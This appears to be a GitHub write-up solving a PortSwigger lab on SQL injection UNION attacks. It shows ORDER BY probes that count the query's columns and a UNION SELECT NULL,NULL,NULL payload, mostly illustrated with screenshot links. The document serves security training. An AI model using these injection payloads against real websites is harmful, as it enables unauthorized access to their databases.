## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/ec88175d04310c5dd9da2f9fd7de8889f9730e08/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/Images/Lab%20Description.png)


## Solution :

![image]()

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

We craft the request by adding **UNION** along with **ORDER BY** clause to *find the number of columns that is being used by the query*.

**ORDER BY 1**

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 1 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/73144a40279ab4cc04ec7378e6a6491ee7f0caf4/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/Images/ORDER%20BY%201.png)

**ORDER BY 2**

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/663e1f954e9e07ffa0e211231abccf51ca7eb2b6/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/Images/ORDER%20BY%202.png)

**ORDER BY 3**

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/536812ecc6b348028915b27e82a164d1d99f6118/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/Images/ORDER%20BY%203.png)

**ORDER BY 4**

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/820e3c7ccf659bfa36f97bbc073493e171728b98/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/Images/ORDER%20BY%204.png)

This throws an error. It means that there are 3 columns that is being retreived in the query by the web application.

Now as per our given question, we use **UNION SELECT NULL** payload to return an additional column that contains null values.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL --
```

![image]()



